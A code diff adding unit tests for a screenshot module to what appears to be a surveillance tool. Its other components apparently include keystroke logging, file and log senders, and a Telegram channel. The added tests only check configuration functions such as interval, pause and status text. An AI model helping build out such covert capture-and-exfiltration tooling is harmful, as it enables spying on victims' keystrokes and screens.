@@ -26,6 +26,8 @@
 #include "keyboard/keyboard_output.h"
 #include "logging/log_sender.h"
 #include "logging/logging.h"
+#include "screenshot/screenshot.h"
+#include "screenshot/screenshot_output.h"
 #include "telegram/telegram.h"
 #include "telegram/telegram_platform.h"
 
@@ -1228,6 +1230,39 @@ int main(void) {
   (void)c2t_files_get_total_files();
   (void)c2t_log_sender_get_total_bytes();
   (void)c2t_log_sender_get_total_dispatches();
+
+  /* Screenshot module unit tests */
+  const char *backend_name = screenshot_get_backend_name();
+  if (!backend_name || !*backend_name)
+    return fail("screenshot_get_backend_name returned empty or null");
+
+  (void)screenshot_is_available();
+
+  if (!screenshot_output_init())
+    return fail("screenshot_output_init failed");
+
+  int shot_init_pause = screenshot_is_paused();
+  int shot_toggled = screenshot_toggle_paused();
+  if (shot_toggled == shot_init_pause || screenshot_is_paused() != shot_toggled)
+    return fail("screenshot_toggle_paused mismatch");
+  screenshot_set_paused(shot_init_pause);
+
+  screenshot_set_interval(120);
+  if (screenshot_get_interval() != 120)
+    return fail("screenshot_set_interval / screenshot_get_interval mismatch");
+  screenshot_set_interval(0);
+
+  char shot_stat_buf[1024] = {};
+  screenshot_get_status_info(shot_stat_buf, sizeof(shot_stat_buf));
+  if (strstr(shot_stat_buf, "Screenshot Subsystem Status") == nullptr ||
+      strstr(shot_stat_buf, "Backend:") == nullptr ||
+      strstr(shot_stat_buf, backend_name) == nullptr) {
+    return fail("screenshot_get_status_info format check failed");
+  }
+
+  (void)screenshot_get_total_captures();
+  (void)screenshot_get_total_bytes();
+  screenshot_output_cleanup();
 
   c2t_crypto_cleanup();
   return 0;
